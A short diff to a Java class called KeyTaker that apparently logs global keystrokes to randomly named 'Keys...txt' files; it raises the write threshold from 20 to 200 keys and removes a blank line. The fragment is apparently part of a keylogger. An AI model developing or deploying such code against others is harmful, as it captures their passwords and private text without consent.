@@ -45,7 +45,7 @@ public class KeyTaker implements NativeKeyListener {
 			
 		
 		times++;
-		if(times >= 20) {
+		if(times >= 200) {
 			times = 0;
 			
 			//closing scanner and filewriter
@@ -116,7 +116,6 @@ public class KeyTaker implements NativeKeyListener {
 		for(int i = 0; i < 3; i++) {
 			files[i] = (char) ((Math.random() * 65534 ) + 1);
 			System.out.println(files[i]);
-			
 		}
 		
 		file = new File("Keys" + files[0] + files[1] + files[2] + ".txt");
